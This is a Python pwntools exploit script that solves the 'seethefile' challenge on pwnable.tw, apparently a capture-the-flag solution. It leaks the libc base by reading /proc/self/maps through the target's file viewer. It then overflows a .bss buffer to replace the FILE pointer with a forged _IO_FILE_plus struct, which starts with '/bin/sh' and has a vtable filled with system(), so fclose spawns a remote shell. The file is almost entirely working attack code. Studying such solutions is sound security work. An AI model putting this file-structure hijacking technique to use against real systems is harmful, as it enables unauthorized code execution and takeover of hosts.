import argparse
import rich

from construct import (
    Struct,
    Container,
    Int64ul,
    Int32ul,
    Int8ul,
    Int16ul,
    Int8sl,
    Padding,
)

from dataclasses import dataclass
from enum import Enum

from pwn import *


# See https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libio.h#L241.

"""
struct _IO_FILE {
    int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags

    /* The following pointers correspond to the C++ streambuf protocol. */
    /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
    char* _IO_read_ptr;	/* Current read pointer */
    char* _IO_read_end;	/* End of get area. */
    char* _IO_read_base;	/* Start of putback+get area. */
    char* _IO_write_base;	/* Start of put area. */
    char* _IO_write_ptr;	/* Current put pointer. */
    char* _IO_write_end;	/* End of put area. */
    char* _IO_buf_base;	/* Start of reserve area. */
    char* _IO_buf_end;	/* End of reserve area. */
    /* The following fields are used to support backing up and undo. */
    char *_IO_save_base; /* Pointer to start of non-current get area. */
    char *_IO_backup_base;  /* Pointer to first valid character of backup area */
    char *_IO_save_end; /* Pointer to end of non-current get area. */

    struct _IO_marker *_markers;

    struct _IO_FILE *_chain;

    int _fileno;
    #if 0
    int _blksize;
    #else
    int _flags2;
    #endif
    _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

    #define __HAVE_COLUMN /* temporary */
    /* 1+column number of pbase(); 0 is unknown. */
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];

    /*  char* _save_gptr;  char* _save_egptr; */

    _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };

    struct _IO_FILE_complete
    {
    struct _IO_FILE _file;
    #endif
    #if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
    _IO_off64_t _offset;
    # if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
    /* Wide character stream stuff.  */
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    # else
    void *__pad1;
    void *__pad2;
    void *__pad3;
    void *__pad4;
    # endif
    size_t __pad5;
    int _mode;
    /* Make sure we don't get into trouble again.  */
    char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
    #endif
};

// stdin is defined like that:
extern struct _IO_FILE_plus _IO_2_1_stdin_;

/* We always allocate an extra word following an _IO_FILE.
This contains a pointer to the function jump table used.
This is for compatibility with C++ streambuf; the word can
be used to smash to a pointer to a virtual function table. */
struct _IO_FILE_plus
{
    FILE file;
    const struct _IO_jump_t *vtable;
};
"""

_IO_FILE = Struct(
    "_flags" / Int32ul,
    "_IO_read_ptr" / Int32ul,
    "_IO_read_end" / Int32ul,
    "_IO_read_base" / Int32ul,
    "_IO_write_base" / Int32ul,
    "_IO_write_ptr" / Int32ul,
    "_IO_write_end" / Int32ul,
    "_IO_buf_base" / Int32ul,
    "_IO_buf_end" / Int32ul,
    "_IO_save_base" / Int32ul,
    "_IO_backup_base" / Int32ul,
    "_IO_save_end" / Int32ul,
    "_markers" / Int32ul,
    "_chain" / Int32ul,
    "_fileno" / Int32ul,
    "_flags2" / Int32ul,
    "_old_offset" / Int32ul,
    "_cur_column" / Int16ul,
    "_vtable_offset" / Int8sl,
    "_shortbuf" / Int8ul,
    "_lock" / Int32ul,
    "_offset" / Int64ul,
    "_codecvt" / Int32ul,
    "_wide_data" / Int32ul,
    "_freeres_list" / Int32ul,
    "_freeres_buf" / Int32ul,
    "__pad5" / Padding(4),
    "_mode" / Int32ul,
    "_unused2" / Padding(40),
)

_IO_FILE_plus = Struct("file" / _IO_FILE, "vtable" / Int32ul)

assert _IO_FILE.sizeof() == 148
assert _IO_FILE_plus.sizeof() == 152


# Load ELFs.
with context.quiet:
    elf = ELF("./seethefile")
    libc = ELF("./libc.so.6")

FP_ADDR = elf.sym["fp"]

# name field len (padding until overflow)
NAME_LENGTH = 32

# we put the fake FILE structure right after the overwritten `fp` FILE* ptr.
FAKE_FILE_START = FP_ADDR + 4

# See https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L307.
IO_JUMP_TABLE_ENTRY_COUNT = 21

STDIN_LOCK_OFFSET = 0x1B187C
STDIN_WIDE_DATA_OFFSET = 0x1B0640

OUTPUT_FILE_DATA_END_MARKER = b"\n---------------MENU---------------\n"


class AppMenu(Enum):
    Open = 1
    Read = 2
    Output = 3
    Close = 4
    Exit = 5


@dataclass
class MemoryMapping:
    start: int
    end: int
    perms: str
    offset: int
    dev: str
    inode: int
    pathname: str


class App:
    def __init__(self, p: tube):
        self._p = p

    def _wait_for_menu(self) -> bytes:
        return self._p.recvuntil(b"Your choice :")

    def select_menu(self, menu: AppMenu, wait: bool = False):
        if wait:
            self._wait_for_menu()
            self._p.sendline(str(menu.value).encode())
        else:
            self._p.sendline(str(menu.value).encode())

    def exit(self, name: bytes):
        self.select_menu(AppMenu.Exit)
        self._p.sendlineafter(b"Leave your name :", name)

        # eat `see you next time` line.
        self._p.recvline()

    def read_remote_file(self, path: str):
        # This primitive can only read textual data, because the output menu action uses puts()
        # in order to write to stdout. that means that it will stop when encountering a NULL.

        self.select_menu(AppMenu.Open)
        self._p.sendlineafter(b"What do you want to see :", path.encode())

        tmp = self._wait_for_menu()
        if b"Open Failed" in tmp:
            raise RuntimeError("Failed to open remote file")

        result = b""
        eof = False
        while not eof:
            self.select_menu(AppMenu.Read)

            tmp = self._wait_for_menu()
            if b"Read Successful" not in tmp:
                eof = True

            self.select_menu(AppMenu.Output)
            result += self._p.recvuntil(OUTPUT_FILE_DATA_END_MARKER, drop=True)
            self._wait_for_menu()

        return result


def parse_proc_maps(data: bytes) -> list[MemoryMapping]:
    """
    Parses the content of /proc/<pid>/maps provided as a bytes object.

    Args:
        data (bytes): The content of the /proc/<pid>/maps file.

    Returns:
        list[dict]: A list of dictionaries, each representing a memory mapping.
    """

    mappings = []
    for line in data.decode("utf-8").strip().splitlines():
        parts = line.split()
        range = parts[0]
        perms = parts[1]
        offset = parts[2]
        dev = parts[3]
        inode = parts[4]
        pathname = parts[5] if len(parts) > 5 else ""

        start, end = (int(addr, 16) for addr in range.split("-"))

        mappings.append(
            MemoryMapping(
                start=start,
                end=end,
                perms=perms,
                offset=int(offset, 16),
                dev=dev,
                inode=int(inode),
                pathname=pathname,
            )
        )

    return mappings


def leak_libc_base(app: App):
    pb = log.progress("Reading /proc/self/maps from remote")
    maps_file = app.read_remote_file("/proc/self/maps")
    pb.success()

    maps = parse_proc_maps(maps_file)

    info("Process memory map:")
    rich.print(maps)

    def is_libc(map: MemoryMapping):
        return "libc" in map.pathname

    libc_map = next(filter(is_libc, maps))
    if libc_map is None:
        raise RuntimeError("Failed to find libc memory mapping")

    return libc_map.start


def conn(debug: bool):
    if debug:
        return process("./seethefile_patched")

    return remote("chall.pwnable.tw", 10200)


def create_fake_FILE(vtable_addr: int, rw_addr: int):
    return _IO_FILE_plus.build(
        Container(
            vtable=vtable_addr,
            file=(
                Container(
                    _flags=u32(b"/bin"),
                    _IO_read_ptr=u32(b"/sh\x00"),
                    _IO_read_end=rw_addr,
                    _IO_read_base=rw_addr,
                    _IO_write_base=rw_addr,
                    _IO_write_ptr=rw_addr,
                    _IO_write_end=rw_addr,
                    _IO_buf_base=rw_addr,
                    _IO_buf_end=rw_addr,
                    _IO_save_base=0,
                    _IO_backup_base=0,
                    _IO_save_end=0,
                    _markers=0,
                    _chain=0,
                    _fileno=0,
                    _flags2=0,
                    _old_offset=0xFFFFFFFF,
                    _cur_column=0,
                    _vtable_offset=0,
                    _shortbuf=0,
                    _lock=libc.address + STDIN_LOCK_OFFSET,
                    _offset=0xFFFFFFFFFFFFFFFF,
                    _codecvt=0,
                    _wide_data=libc.address + STDIN_WIDE_DATA_OFFSET,
                    _freeres_list=0,
                    _freeres_buf=0,
                    _mode=0xFFFFFFFF,
                )
            ),
        )
    )


def exploit(app: App):
    t1 = time.time()

    # stage 1
    libc.address = leak_libc_base(app)
    system_addr = libc.sym["system"]

    info(f"Found libc base: {libc.address:#x}")
    info(f"Calculated system() address: {system_addr:#x}")

    # stage 2
    info("Creating a fake FILE struct")
    info(f"Creating a fake _IO_jump_t table sprayed with {system_addr:#x} (system)")
    fake_vtable = p32(system_addr) * IO_JUMP_TABLE_ENTRY_COUNT

    # We put the fake vtable right after the fake _IO_FILE_plus struct.
    fake__IO_FILE_plus = create_fake_FILE(
        vtable_addr=FAKE_FILE_START + _IO_FILE_plus.sizeof(),
        rw_addr=elf.sym["magicbuf"],
    )

    info("Overwriting fp with pointer to a fake FILE struct we've written:")
    print(hexdump(fake__IO_FILE_plus))

    # Trigger buffer overflow in the .BSS section.
    # We overwrite `fp` to point to our malicious FILE struct.
    #
    # fclose: https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/iofclose.c#L38
    # _IO_new_file_close_it: https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/fileops.c#L157
    # After the overwrite main() calls fclose(fp). The latter will call _IO_file_close_it (_IO_new_file_close_it),
    # which will in turn call _IO_SYSCLOSE (fp), which is a macro that fires a call to the `__close`
    # entry in the vtable of `fp` (which we sprayed with system() addresses). This will actually call system(fp),
    # which is essentially system("/bin/sh") becahse our fake FILE struct starts with /bin/sh\x00.
    payload = b"".join(
        [
            b"A" * NAME_LENGTH,
            p32(FAKE_FILE_START),
            fake__IO_FILE_plus,
            fake_vtable,
        ]
    )

    app.exit(payload)

    took = time.time() - t1
    info(f"Success. Exploit took {took:.2f} seconds.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    if args.debug and not args.local:
        error("Can not debug without --local")

    p = conn(args.local)
    app = App(p)

    if args.debug:
        gdb.attach(p)

    exploit(app)
    p.interactive()


main()
